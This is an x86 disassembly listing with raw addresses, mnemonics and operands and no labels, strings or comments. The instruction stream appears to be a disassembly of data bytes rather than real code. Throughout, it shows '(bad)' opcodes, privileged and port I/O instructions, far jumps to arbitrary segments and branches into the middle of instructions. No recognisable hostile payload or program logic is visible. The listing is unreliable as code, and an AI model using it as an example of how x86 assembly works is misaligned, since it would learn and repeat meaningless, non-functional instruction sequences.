  4192d2:	adc    eax,DWORD PTR [eax+0x79dadadd]
  4192d8:	dec    ebp
  4192d9:	or     BYTE PTR [ebp+0x35636efd],dh
  4192df:	inc    edi
  4192e0:	sub    eax,0x9d7ceca0
  4192e5:	in     eax,dx
  4192e6:	cmp    DWORD PTR [edi+0x53eb39f4],0xb5c9
	...
  419354:	add    BYTE PTR [eax],al
  419356:	mov    al,ds:0xff33bae7
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	sbb    al,0xf6
  419364:	mov    dh,dh
  419366:	sgdtd  [bx+si]
  41936a:	add    BYTE PTR [ecx],al
  41936c:	add    BYTE PTR [eax],al
  41936e:	inc    esi
  41936f:	jae    0x4193a9
  419371:	aas    
  419372:	repz lds edi,FWORD PTR [edi]
  419375:	stc    
  419376:	sub    dl,BYTE PTR [ebp+esi*2-0x316aef93]
  41937d:	cwde   
  41937e:	outs   dx,BYTE PTR ds:[esi]
  41937f:	ins    DWORD PTR es:[edi],dx
  419380:	icebp  
  419381:	inc    edx
  419382:	icebp  
  419383:	inc    ebp
  419384:	ss or  al,0x4f
  419387:	jmp    0x4193bf
  419389:	adc    eax,0x94d2e3f6
  41938e:	or     eax,DWORD PTR [ebx-0x70]
  419391:	clc    
  419392:	cmp    ch,ch
  419394:	imul   eax,DWORD PTR [ebx+0xa],0xffffffea
  419398:	add    BYTE PTR [edi-0x24],dh
  41939b:	fs cmc 
  41939d:	push   0xffffffd2
  41939f:	mov    esi,0x5d10a73b
  4193a4:	or     DWORD PTR ds:0xe4c8728d,edx
  4193aa:	repz sahf 
  4193ac:	or     BYTE PTR [edi+edx*2+0x621be44a],cl
  4193b3:	push   ss
  4193b4:	fs (bad) 
  4193b6:	enter  0xcad6,0xd6
  4193ba:	inc    eax
  4193bb:	std    
  4193bc:	jbe    0x41937e
  4193be:	sub    edx,0x1a
  4193c1:	arpl   di,bx
  4193c3:	mov    esi,0xef0db153
  4193c8:	mov    ch,0xef
  4193ca:	add    al,0x99
  4193cc:	push   ebx
  4193cd:	js     0x4193c4
  4193cf:	mov    ebp,DWORD PTR [ecx]
  4193d1:	and    eax,0xee141fc7
  4193d6:	mov    al,dh
  4193d8:	dec    eax
  4193d9:	xor    al,0x1b
  4193db:	jecxz  0x419404
  4193dd:	in     eax,0x8e
  4193df:	mov    al,ds:0xb08a3bf3
  4193e4:	stos   DWORD PTR es:[edi],eax
  4193e5:	fmulp  st(3),st
  4193e7:	xor    dl,BYTE PTR [ebx+eiz*2-0x26]
  4193eb:	sub    eax,DWORD PTR [ecx+esi*4+0x6411aae0]
  4193f2:	clc    
  4193f3:	xor    dl,BYTE PTR [eax+0x10]
  4193f6:	loop   0x419412
  4193f8:	fcom   QWORD PTR [ebx-0x3264f795]
  4193fe:	fdivr  QWORD PTR [ecx+0x68]
  419401:	(bad)  
  419402:	xchg   esi,eax
  419403:	push   edi
  419404:	sbb    dl,BYTE PTR [esi-0x7f26eff0]
  41940a:	jge    0x4193ed
  41940c:	mov    ecx,DWORD PTR [edi]
  41940e:	mov    al,ds:0x6ec1e995
  419413:	or     esi,edx
  419415:	and    ebp,DWORD PTR [edx]
  419417:	or     BYTE PTR [ebp+0x38],bh
  41941a:	push   edx
  41941b:	pop    edi
  41941c:	loopne 0x41946b
  41941e:	out    dx,al
  41941f:	repnz mov dl,0xce
  419423:	fnsave [ecx+0x2a]
  419426:	xor    BYTE PTR [ebx+0x60],dl
  419429:	mov    eax,ds:0x165d2fc7
  41942e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41942f:	cmp    al,BYTE PTR [esi-0x434c303d]
  419435:	stc    
  419436:	sbb    al,0x73
  419438:	out    0x88,eax
  41943a:	adc    eax,0x81f7aedd
  41943f:	sbb    ah,BYTE PTR [ebp+ebx*2+0x48]
  419443:	(bad)  
  419444:	add    BYTE PTR [eax-0x3e],cl
  419447:	sbb    al,ch
  419449:	pmulhuw mm7,QWORD PTR [ebp-0x66]
  41944d:	push   ds
  41944e:	inc    edi
  41944f:	push   esp
  419450:	test   esp,0x266e0b43
  419456:	mov    cs,WORD PTR [eax-0x1c]
  419459:	test   al,0xdb
  41945b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41945c:	add    eax,0x1b172c36
  419461:	add    eax,0x13ecb672
  419466:	jns    0x41945b
  419468:	mov    bh,ah
  41946a:	jge    0x41944c
  41946c:	pushf  
  41946d:	pop    DWORD PTR [eax]
	...
  4194d3:	add    BYTE PTR [eax],al
  4194d5:	add    BYTE PTR ds:0xed3a6998,bh
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	mov    cl,0x86
  4194e4:	jge    0x4194ea
  4194e6:	adc    BYTE PTR [bx+di],al
  4194e9:	add    BYTE PTR [eax],al
  4194eb:	add    DWORD PTR [eax],eax
  4194ed:	add    BYTE PTR [esi],dl
  4194ef:	out    dx,eax
  4194f0:	and    eax,0x5cb77599
  4194f5:	push   ss
  4194f6:	push   0xffffffa0
  4194f8:	fs push es
  4194fa:	jns    0x41947c
  4194fc:	mov    ah,0x8f
  4194fe:	stos   BYTE PTR es:[edi],al
  4194ff:	cmp    esp,edx
  419501:	and    cl,BYTE PTR [edi-0x762c477f]
  419507:	std    
  419508:	and    bh,BYTE PTR [ecx-0x1ff4f8aa]
  41950e:	adc    eax,0xeaf87125
  419513:	das    
  419514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419515:	and    ebx,DWORD PTR [esi+edi*4+0x212ec8c5]
  41951c:	call   0x96b22ab6
  419521:	test   al,0x39
  419523:	sub    dl,BYTE PTR [esi-0x3b7f37e2]
  419529:	repz imul eax,DWORD PTR [ecx-0x519fb011],0x13
  419531:	call   0x149a:0x705b08fb
  419538:	mul    DWORD PTR [eax-0x17]
  41953b:	xlat   BYTE PTR ds:[ebx]
  41953c:	mov    esi,0xe476e82d
  419541:	out    0x8a,eax
  419543:	lods   al,BYTE PTR ds:[esi]
  419544:	out    0xa3,eax
  419546:	bound  ebx,QWORD PTR [ecx+0x793c3c66]
  41954c:	push   eax
  41954d:	jno    0x4195ac
  41954f:	fisubr DWORD PTR [edi+0x4c]
  419552:	cmc    
  419553:	lea    edx,[edi+0x43cd77d5]
  419559:	aaa    
  41955a:	iret   
  41955b:	pop    ecx
  41955c:	add    DWORD PTR [ebp-0x5e],0x52
  419560:	dec    esi
  419561:	adc    BYTE PTR [esi+0x3e],0x1b
  419565:	imul   eax,DWORD PTR [edi],0xa73789ec
  41956b:	pop    esp
  41956c:	(bad)
  41956f:	xchg   esp,eax
  419570:	mov    bh,0xeb
  419572:	xchg   BYTE PTR [ebp+0x5],al
  419575:	push   ss
  419576:	add    DWORD PTR [ebx-0x4cec54b2],0xffffffb5
  41957d:	ins    BYTE PTR es:[edi],dx
  41957e:	cmp    al,0xd4
  419580:	je     0x4195b1
  419582:	push   ds
  419583:	aad    0x93
  419585:	mov    dh,0xad
  419587:	icebp  
  419588:	gs mov esp,eax
  41958b:	in     al,0x44
  41958d:	stc    
  41958e:	pop    edi
  41958f:	or     al,0xc4
  419591:	loope  0x41954e
  419593:	pop    ebp
  419594:	jbe    0x41954a
  419596:	inc    edi
  419597:	pop    ebx
  419598:	mov    bh,0x57
  41959a:	dec    esi
  41959b:	xchg   edi,eax
  41959c:	push   cs
  41959d:	inc    ebp
  41959e:	xor    ch,dh
  4195a0:	icebp  
  4195a1:	scas   al,BYTE PTR es:[edi]
  4195a2:	lods   al,BYTE PTR ds:[esi]
  4195a3:	cmc    
  4195a4:	out    dx,eax
  4195a5:	stc    
  4195a6:	mov    ?,WORD PTR [esi+0x114967bf]
  4195ac:	mov    bh,0xd2
  4195ae:	ss pop ss
  4195b0:	lods   al,BYTE PTR ds:[esi]
  4195b1:	or     bh,ah
  4195b3:	fisub  WORD PTR [ebp+0x2b05d38e]
  4195b9:	adc    al,0x75
  4195bb:	fsubr  QWORD PTR [eax+edi*8]
  4195be:	retf   
  4195bf:	fsubr  st,st(4)
  4195c1:	push   ds
  4195c2:	jmp    0x3d86:0xa820ef01
  4195c9:	cmp    bl,BYTE PTR ds:0x1af93019
  4195cf:	ins    DWORD PTR es:[edi],dx
  4195d0:	inc    eax
  4195d1:	dec    ecx
  4195d2:	hlt    
  4195d3:	sbb    al,0x3d
  4195d5:	mov    dl,0x9d
  4195d7:	pop    eax
  4195d8:	cdq    
  4195d9:	(bad)  
  4195da:	loop   0x4195f4
  4195dc:	out    dx,al
  4195dd:	sbb    cl,al
  4195df:	popa   
  4195e0:	in     al,0xf6
  4195e2:	jnp    0x419589
  4195e4:	pop    ebx
  4195e5:	xor    edi,esp
  4195e7:	adc    BYTE PTR [ebp+eax*2+0x2d],dh
  4195eb:	das    
  4195ec:	out    0x37,al
	...
  419656:	scas   eax,DWORD PTR es:[edi]
  419657:	aam    0x8d
  419659:	(bad)  
  41965a:	(bad)  
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	jle    0x41961c
  419664:	mov    esp,0x11167c2
  419669:	add    BYTE PTR [eax],al
  41966b:	add    DWORD PTR [eax],eax
  41966d:	add    BYTE PTR [edx-0x75],cl
  419670:	mov    esi,0x10f74b74
  419675:	and    eax,0x578ec565
  41967a:	leave  
  41967b:	(bad)  
  41967c:	xchg   ebp,eax
  41967d:	or     ebx,esp
  41967f:	cwde   
  419680:	or     al,0x7c
  419682:	push   edi
  419683:	into   
  419684:	jecxz  0x419608
  419686:	mov    ds:0xb187b4b6,eax
  41968b:	scas   al,BYTE PTR es:[edi]
  41968c:	(bad)  
  41968e:	test   BYTE PTR [ebx+0x32d7e2dc],al
  419694:	es pop esp
  419696:	in     al,dx
  419697:	sub    al,0xfd
  419699:	inc    ecx
  41969a:	push   edx
  41969b:	pop    ds
  41969c:	jnp    0x4196f5
  41969e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41969f:	fisubr WORD PTR [esi]
  4196a1:	mov    ecx,DWORD PTR [ecx-0x6b]
  4196a4:	imul   ebx,DWORD PTR [esi],0xffffffdf
  4196a7:	mov    al,ds:0x62738c0f
  4196ac:	cs (bad) 
  4196ae:	test   al,0x18
  4196b0:	inc    esp
  4196b1:	sub    ebp,DWORD PTR [esp+edx*2+0x7098d939]
  4196b8:	jnp    0x4196df
  4196ba:	call   0x8c7ffb79
  4196bf:	stos   BYTE PTR es:[edi],al
  4196c0:	mov    cl,0x6f
  4196c2:	aaa    
  4196c3:	pusha  
  4196c4:	aad    0x19
  4196c6:	outs   dx,BYTE PTR ds:[esi]
  4196c7:	push   0x40
  4196c9:	add    al,0x6a
  4196cb:	mov    bh,0xe4
  4196cd:	push   esp
  4196ce:	dec    eax
  4196cf:	lods   al,BYTE PTR ds:[esi]
  4196d0:	cs int3 
  4196d2:	test   edx,ebp
  4196d4:	mov    DWORD PTR [ebp+0x188adbf],ebp
  4196da:	xchg   ecx,eax
  4196db:	outs   dx,BYTE PTR ds:[esi]
  4196dc:	dec    eax
  4196dd:	pop    eax
  4196de:	mov    ch,0xd9
  4196e0:	pop    ss
  4196e1:	leave  
  4196e2:	sahf   
  4196e3:	add    eax,0xa41f4c46
  4196e8:	mov    WORD PTR [eax-0x3f95f405],?
  4196ee:	fisub  DWORD PTR [edi]
  4196f0:	pop    ecx
  4196f1:	aam    0xca
  4196f3:	lds    edx,FWORD PTR [ecx]
  4196f5:	xchg   edx,eax
  4196f6:	int3   
  4196f7:	xchg   esi,eax
  4196f8:	cld    
  4196f9:	pop    ds
  4196fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196fb:	int3   
  4196fc:	rcr    cl,cl
  4196fe:	fs jge 0x4196fa
  419701:	jne    0x41971a
  419703:	inc    edi
  419704:	or     DWORD PTR [edx+0x25],ebx
  419707:	xchg   esi,eax
  419708:	cmp    DWORD PTR [edx],eax
  41970a:	xor    cl,BYTE PTR [ebp+0x70b67970]
  419710:	sub    bl,BYTE PTR [ebp+ecx*2-0x65]
  419714:	not    bl
  419716:	pop    eax
  419717:	lock dec edi
  419719:	int    0xb1
  41971b:	dec    eax
  41971c:	(bad)  
  41971d:	scas   eax,DWORD PTR es:[edi]
  41971e:	stc    
  41971f:	jp     0x419715
  419721:	cmp    al,0x90
  419723:	pop    esi
  419724:	dec    edi
  419725:	jmp    0x4196bb
  419727:	jp     0x41971c
  419729:	dec    edx
  41972a:	jno    0x419779
  41972c:	xor    DWORD PTR [eax],eax
  41972e:	sbb    al,dh
  419730:	dec    ecx
  419731:	hlt    
  419732:	xor    DWORD PTR cs:[esi],edx
  419735:	and    BYTE PTR [ecx+0x2b],ah
  419738:	ins    BYTE PTR es:[edi],dx
  419739:	xor    ch,cl
  41973b:	stos   DWORD PTR es:[edi],eax
  41973c:	mov    al,ds:0xd7cfc98e
  419741:	adc    ch,BYTE PTR [ecx-0x64c1da9f]
  419747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419748:	xchg   ebx,esi
  41974a:	loopne 0x419730
  41974c:	pop    esp
  41974d:	div    DWORD PTR [ecx]
  41974f:	inc    ecx
  419750:	jp     0x4197ce
  419752:	gs (bad) 
  419754:	jb     0x419784
  419756:	or     esp,edx
  419758:	cmp    eax,0xaf0f5777
  41975d:	and    eax,0x1b499631
  419762:	xor    DWORD PTR [esi+0x4fbbc3ec],0xd63861f5
  41976c:	sbb    al,0xd1
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0x8b8dd0ae
  4197e3:	or     DWORD PTR [esi+0x112677d],0x10000
  4197ed:	add    BYTE PTR [edi-0x10],ah
  4197f0:	xor    eax,0x55fff1da
  4197f5:	pop    ss
  4197f6:	rcl    eax,1
  4197f8:	jns    0x41983b
  4197fa:	loopne 0x419860
  4197fc:	repnz cmp edi,DWORD PTR [edi]
  4197ff:	(bad)  
  419801:	and    dh,BYTE PTR [esi]
  419803:	and    edi,DWORD PTR ds:[eax]
  419806:	stos   BYTE PTR es:[edi],al
  419807:	cmp    ebp,ebx
  419809:	sahf   
  41980a:	or     DWORD PTR [ebp+0x16509b87],edx
  419810:	scas   al,BYTE PTR es:[edi]
  419811:	xor    eax,0x62f5f00b
  419816:	lods   al,BYTE PTR ds:[esi]
  419817:	sub    cl,BYTE PTR [ebp+0xd23a643]
  41981d:	fnstcw WORD PTR [ebx+0x7cad666a]
  419823:	fnstcw WORD PTR ds:0xf84cb945
  419829:	je     0x4197d1
  41982b:	pop    esi
  41982c:	cmp    ecx,DWORD PTR [edi+0x70e26bb2]
  419832:	sbb    al,0xbf
  419834:	and    al,0x6c
  419836:	xor    al,0x73
  419838:	inc    ecx
  419839:	cmp    al,BYTE PTR [ebp+ebx*8+0x6b885e7f]
  419840:	mov    DWORD PTR [edi+0x2b],edx
  419843:	xor    al,0x75
  419845:	(bad)  
  419846:	sbb    DWORD PTR [esi-0x67c7cc29],ebp
  41984c:	rcl    ebx,0xa4
  41984f:	call   DWORD PTR [esi+0x5dde99ea]
  419855:	popa   
  419856:	mov    BYTE PTR [edi-0xa1c5071],ch
  41985c:	pop    eax
  41985d:	cmp    eax,0xbc27da
  419862:	pop    esi
  419863:	out    0x5e,al
  419865:	inc    edi
  419866:	out    0x37,eax
  419868:	sti    
  419869:	clc    
  41986a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41986b:	popf   
  41986c:	add    al,0x30
  41986e:	daa    
  41986f:	dec    ebx
  419870:	or     DWORD PTR ds:0x892d5532,esp
  419876:	mov    edi,0xd2836c2d
  41987b:	or     eax,0x119c5c6a
  419880:	or     esp,eax
  419882:	cmc    
  419883:	xchg   esp,eax
  419884:	aam    0xef
  419886:	retf   
  419887:	arpl   WORD PTR [eax+0x24fdc3ca],sp
  41988d:	ret    
  41988e:	sub    esp,DWORD PTR [eax-0x13]
  419891:	mov    ?,WORD PTR [ecx+0x40091835]
  419897:	xchg   esp,eax
  419898:	sub    BYTE PTR [eax-0x5f],bl
  41989b:	mov    edx,0x67b431ff
  4198a0:	add    ecx,esi
  4198a2:	mov    al,0x2e
  4198a4:	dec    edx
  4198a5:	adc    DWORD PTR [edi-0x4f],ebp
  4198a8:	sbb    DWORD PTR [ecx-0x383278a0],eax
  4198ae:	imul   edi,DWORD PTR [edi],0x3
  4198b1:	mov    edi,0x2756c8c3
  4198b6:	fwait
  4198b7:	push   ecx
  4198b8:	or     al,0xa
  4198ba:	or     BYTE PTR [edx+0x38],0xab
  4198be:	aas    
  4198bf:	adc    al,0xf7
  4198c1:	clc    
  4198c2:	or     bl,BYTE PTR [edx+eiz*4-0x47273e7e]
  4198c9:	mov    ebx,0xb5043020
  4198ce:	and    eax,0xc059a7e0
  4198d3:	push   0xffffff8e
  4198d5:	mov    edi,0x95725bec
  4198da:	xor    al,0x63
  4198dc:	jge    0x4198a5
  4198de:	popa   
  4198df:	ins    DWORD PTR es:[edi],dx
  4198e0:	out    0xec,al
  4198e2:	fucom  st(7)
  4198e4:	call   DWORD PTR [eax]
  4198e6:	(bad)  
  4198e7:	icebp  
  4198e8:	cmp    dh,bl
  4198ea:	fmul   DWORD PTR [edx]
  4198ed:	add    DWORD PTR [eax],0x0
	...
  419954:	add    BYTE PTR [eax],al
  419956:	sbb    BYTE PTR [ecx],0x47
  419959:	loope  0x41993a
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fucom  st(6)
  419963:	adc    cl,ch
  419965:	mov    ds:0x11367,al
  41996a:	add    BYTE PTR [ecx],al
  41996c:	add    BYTE PTR [eax],al
  41996e:	inc    esi
  41996f:	xchg   ebx,eax
  419970:	add    BYTE PTR [esi-0x78b5d50e],cl
  419976:	inc    edi
  419977:	mov    ebx,DWORD PTR ds:0xe38662b9
  41997d:	test   eax,0x882d6e61
  419982:	imul   ebp,DWORD PTR [esi-0x1602dd66],0x48
  419989:	add    eax,0xe52e33fb
  41998e:	xor    dl,BYTE PTR [edx+esi*8-0x4a3d6ca8]
  419995:	imul   edi,eax,0x8
  419998:	add    eax,0x629980d1
  41999d:	mov    edx,0x4c66f024
  4199a2:	imul   edi,edi,0xa5e385fb
  4199a8:	inc    esi
  4199a9:	in     eax,0x1f
  4199ab:	add    eax,esi
  4199ad:	xchg   DWORD PTR [edx],eax
  4199af:	xor    cl,BYTE PTR [eax+ebx*8]
  4199b2:	sub    DWORD PTR [ebx],esi
  4199b4:	xchg   ecx,eax
  4199b5:	les    edx,FWORD PTR [edi+eiz*4+0x8]
  4199b9:	repnz dec ebx
  4199bb:	or     bl,bh
  4199bd:	imul   eax,DWORD PTR [eax+0x4fe0b474],0xfffffff2
  4199c4:	sti    
  4199c5:	pop    es
  4199c6:	ret    
  4199c7:	(bad)  
  4199c9:	fsubp  st(1),st
  4199cb:	mov    ch,0x39
  4199cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199ce:	mov    WORD PTR [ebp-0x786f4056],fs
  4199d4:	pop    edi
  4199d5:	mov    dh,0xa1
  4199d7:	ss cmp al,0xc9
  4199da:	mov    esp,0x987cf747
  4199df:	mov    dl,0xb1
  4199e1:	daa    
  4199e2:	adc    eax,0xac2fd407
  4199e7:	jbe    0x4199dc
  4199e9:	pop    es
  4199ea:	and    eax,0x9140d54
  4199ef:	pop    ecx
  4199f0:	in     ax,0xc6
  4199f3:	out    dx,eax
  4199f4:	outs   dx,BYTE PTR ds:[esi]
  4199f5:	repnz in al,dx
  4199f7:	sub    ecx,edx
  4199f9:	mov    bh,0xdf
  4199fb:	cli    
  4199fc:	xchg   ecx,eax
  4199fd:	stc    
  4199fe:	loopne 0x41998b
  419a00:	in     eax,dx
  419a01:	add    ebp,0xcade3617
  419a07:	retf   
  419a08:	bound  edi,QWORD PTR [edx+0x66f00c06]
  419a0e:	(bad)  
  419a0f:	dec    ebx
  419a10:	push   esi
  419a11:	out    dx,eax
  419a12:	dec    edi
  419a13:	enter  0x3b73,0x9e
  419a17:	sub    dh,dh
  419a19:	inc    esp
  419a1a:	idiv   DWORD PTR [ecx-0x1a]
  419a1d:	mov    al,0x42
  419a1f:	xor    ebp,ecx
  419a21:	in     al,0x9c
  419a23:	inc    ebx
  419a24:	sub    al,0x2d
  419a26:	pop    eax
  419a27:	movlps xmm2,QWORD PTR [ecx]
  419a2a:	clc    
  419a2b:	push   ebx
  419a2c:	rcl    ebp,1
  419a2e:	cmp    al,0x5e
  419a30:	out    dx,al
  419a31:	cmp    al,0xc7
  419a33:	lds    ebx,FWORD PTR [ecx]
  419a35:	sahf   
  419a36:	cmp    BYTE PTR [ebx-0x3e],0xca
  419a3a:	out    dx,eax
  419a3b:	add    DWORD PTR [ebp-0x31ca68c],0x7b
  419a42:	and    eax,0xa0f2c2f
  419a47:	mov    al,0xe3
  419a49:	idiv   DWORD PTR [ecx-0x47]
  419a4c:	jecxz  0x419a4c
  419a4e:	xor    DWORD PTR [esi],eax
  419a50:	mov    ds:0x20e45081,eax
  419a55:	and    BYTE PTR [edi+0x1b],0xa3
  419a59:	mov    esp,0xf5833e48
  419a5e:	inc    esp
  419a5f:	test   al,0xaf
  419a61:	xchg   esp,eax
  419a62:	dec    ecx
  419a63:	scas   al,BYTE PTR es:[edi]
  419a64:	ja     0x4199fa
  419a66:	aam    0xad
  419a68:	cdq    
  419a69:	pop    es
  419a6a:	retf   
  419a6b:	stos   DWORD PTR es:[edi],eax
  419a6c:	pop    edx
  419a6d:	cwde   
	...
  419ad6:	xor    esi,DWORD PTR [ecx]
  419ad8:	xchg   ebx,eax
  419ad9:	lds    edx,FWORD PTR [ebx-0x34088819]
  419adf:	rcl    DWORD PTR ds:0x8abc3bc2,cl
  419ae5:	loope  0x419b4e
  419ae7:	adc    al,0x1
  419ae9:	add    BYTE PTR [eax],al
  419aeb:	add    DWORD PTR [eax],eax
  419aed:	add    BYTE PTR [edx+edx*2],dh
  419af0:	stos   DWORD PTR es:[edi],eax
  419af1:	(bad)  
  419af2:	test   al,0xce
  419af4:	aam    0xd8
  419af6:	and    eax,0x87ec4be3
  419afb:	aaa    
  419afc:	aas    
  419afd:	sahf   
  419afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aff:	popf   
  419b00:	mov    eax,0x60674952
  419b05:	cld    
  419b06:	and    dl,ch
  419b08:	mov    DWORD PTR [ebx+0x20bae408],eax
  419b0e:	shl    BYTE PTR [edi+0x5c3929b],1
  419b14:	in     eax,0xc5
  419b16:	and    al,0x60
  419b18:	xchg   edx,eax
  419b19:	ret    
  419b1a:	pop    edx
  419b1b:	ja     0x419b03
  419b1d:	inc    edi
  419b1e:	dec    edi
  419b1f:	dec    edx
  419b20:	daa    
  419b21:	cli    
  419b22:	sub    ah,ch
  419b24:	data16 jne 0x419b7d
  419b27:	cld    
  419b28:	idiv   esp
  419b2a:	xor    BYTE PTR [edx],bh
  419b2c:	push   ebx
  419b2d:	popa   
  419b2e:	push   0x76
  419b30:	mov    ebp,0x9cadc66b
  419b35:	hlt    
  419b36:	xchg   DWORD PTR [eax+0x56521855],eax
  419b3c:	call   0xc984454f
  419b41:	sbb    al,0x77
  419b43:	jl     0x419bbf
  419b45:	pop    ds
  419b46:	outs   dx,BYTE PTR ds:[esi]
  419b47:	aad    0xaa
  419b49:	(bad)  
  419b4a:	mov    ds:0x6ddf5dd4,eax
  419b4f:	repnz push edx
  419b51:	aas    
  419b52:	loopne 0x419ba2
  419b54:	mov    esi,0xe1b8cd5a
  419b59:	cmp    bh,BYTE PTR [ecx-0x6a]
  419b5c:	data16 das 
  419b5e:	dec    esp
  419b5f:	add    eax,0xa806f591
  419b64:	ss jb  0x419b46
  419b67:	(bad)  
  419b68:	in     eax,dx
  419b69:	shl    BYTE PTR [edx],cl
  419b6b:	sbb    DWORD PTR [ecx-0x3d39c0c],edx
  419b71:	inc    edx
  419b72:	mov    ecx,0x4abc4557
  419b77:	mov    ebx,0x45dd5b89
  419b7c:	mov    esp,0x76a10320
  419b81:	repz cmps WORD PTR ds:[esi],WORD PTR es:[edi]
  419b84:	inc    eax
  419b85:	frstor [edi+0x39c9a2f0]
  419b8b:	push   0xe3910251
  419b90:	fsubr  DWORD PTR [esi]
  419b92:	inc    eax
  419b93:	mov    cl,0xfe
  419b95:	mov    ds:0x3eb8b691,eax
  419b9a:	test   BYTE PTR [edi-0x21],al
  419b9d:	ror    BYTE PTR [ebx],cl
  419b9f:	aaa    
  419ba0:	xor    ebx,DWORD PTR [eax+eiz*8+0x50d6ce8f]
  419ba7:	xor    BYTE PTR [edi+0x436e2dc6],ah
  419bad:	sbb    DWORD PTR [ecx+0x29cc1df7],eax
  419bb3:	div    DWORD PTR [ebp+0x1f]
  419bb6:	inc    BYTE PTR [eax]
  419bb8:	div    BYTE PTR [edi+0x2d]
  419bbb:	mov    esp,0xdaeccc6a
  419bc0:	pop    edx
  419bc2:	dec    edi
  419bc3:	bndstx [ebp-0x4e10716c],bnd1
  419bca:	les    ebp,FWORD PTR [edi+0x26]
  419bcd:	jne    0x419bc7
  419bcf:	mov    ecx,0xa1978437
  419bd4:	call   0x89db:0x527a4921
  419bdb:	arpl   WORD PTR [ebp+0x4769d936],sp
  419be1:	into   
  419be2:	push   ebx
  419be3:	sbb    DWORD PTR [edx+0x5c],0x57babc89
  419bea:	adc    BYTE PTR [ecx-0x70],0xe2
	...
  419c56:	dec    edx
  419c57:	(bad)  
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0x3f
  419c63:	dec    ebx
  419c64:	out    dx,eax
  419c65:	jb     0x419cce
  419c67:	adc    eax,0x1000001
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	mov    ch,0xd9
  419c70:	cmp    al,0xa
  419c72:	inc    edi
  419c73:	and    bl,BYTE PTR ss:[ecx]
  419c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c77:	pop    ecx
  419c78:	call   DWORD PTR [esi*8-0x2d8dd447]
  419c7f:	rcl    BYTE PTR [ebx-0x53],0xb0
  419c83:	inc    esp
  419c84:	mov    edx,0xf6b2d6a
  419c89:	add    al,0x79
  419c8b:	cdq    
  419c8c:	outs   dx,BYTE PTR ds:[esi]
  419c8d:	mov    bl,0xd3
  419c8f:	pushf  
  419c90:	xchg   esi,eax
  419c91:	push   esi
  419c92:	cdq    
  419c93:	je     0x419ce2
  419c95:	mov    esp,0x973f5a1
  419c9a:	enter  0x3965,0x6e
  419c9e:	cmp    cl,0xda
  419ca1:	imul   ecx,DWORD PTR [ecx],0x15bb301b
  419ca7:	(bad)  
  419ca8:	push   ecx
  419ca9:	dec    ebp
  419caa:	iret   
  419cab:	pop    ds
  419cac:	sar    BYTE PTR [eax+0x4f024a54],0x7
  419cb3:	mul    DWORD PTR [esp+ecx*8]
  419cb6:	jns    0x419ca7
  419cb8:	cli    
  419cb9:	xchg   ecx,eax
  419cba:	or     BYTE PTR [eax],0xb8
  419cbd:	dec    ecx
  419cbe:	xchg   ebx,eax
  419cbf:	cwde   
  419cc0:	pop    eax
  419cc1:	ret    0x5b1e
  419cc4:	pop    esi
  419cc5:	adc    ebp,DWORD PTR [ebx+edx*4]
  419cc8:	xchg   edi,eax
  419cc9:	pop    ds
  419cca:	pop    esp
  419ccb:	xor    edi,DWORD PTR [esi-0x73]
  419cce:	push   0x5262734a
  419cd3:	jmp    0xb250:0x87eeb47b
  419cda:	cmp    eax,0xb38a2f3b
  419cdf:	jo     0x419d34
  419ce1:	or     ah,bh
  419ce3:	fst    DWORD PTR [ebp+0x27f4f97e]
  419ce9:	push   es
  419cea:	cmp    BYTE PTR [esi-0x2b],dh
  419ced:	les    esi,FWORD PTR [edi]
  419cef:	push   cs
  419cf0:	inc    ebx
  419cf1:	loope  0x419d6c
  419cf3:	or     BYTE PTR [ebx],dh
  419cf5:	push   edx
  419cf6:	xor    BYTE PTR [esp+eax*2+0x755b7150],0x9
  419cfe:	mov    esi,0x4e43e30b
  419d03:	or     BYTE PTR [ebp-0x1d],cl
  419d06:	adc    DWORD PTR [edi+0x2063a939],edi
  419d0c:	or     eax,0xf7a11a49
  419d11:	test   al,0x6e
  419d13:	(bad)  
  419d14:	jo     0x419d70
  419d16:	pop    ecx
  419d17:	push   ebp
  419d18:	aad    0xc0
  419d1a:	pusha  
  419d1b:	pop    ds
  419d1c:	mov    esi,0x855b6279
  419d21:	shr    BYTE PTR [eax],cl
  419d23:	mov    cl,0xa
  419d25:	push   ebp
  419d26:	sar    DWORD PTR [eax-0x38],0xda
  419d2a:	pop    es
  419d2b:	imul   edx,DWORD PTR [ebx+0x40d0fc2d],0xbf35c811
  419d35:	push   edi
  419d36:	mov    esi,0xcd48e18
  419d3b:	mov    al,0x74
  419d3d:	gs xchg ecx,eax
  419d3f:	push   edi
  419d40:	sbb    DWORD PTR [edx-0x466ca138],esp
  419d46:	dec    ebp
  419d47:	cwde   
  419d48:	fnsave [eax]
  419d4a:	aad    0xa3
  419d4c:	jae    0x419d14
  419d4e:	out    0xe,eax
  419d50:	repnz mov ax,0xca94
  419d55:	cdq    
  419d56:	lods   al,BYTE PTR ds:[esi]
  419d57:	dec    esi
  419d58:	sbb    esp,ebx
  419d5a:	mov    edx,0x61e068d1
  419d5f:	mov    ch,0x6b
  419d61:	cmc    
  419d62:	jp     0x419db7
  419d64:	pop    ecx
  419d65:	lock packssdw mm6,mm1
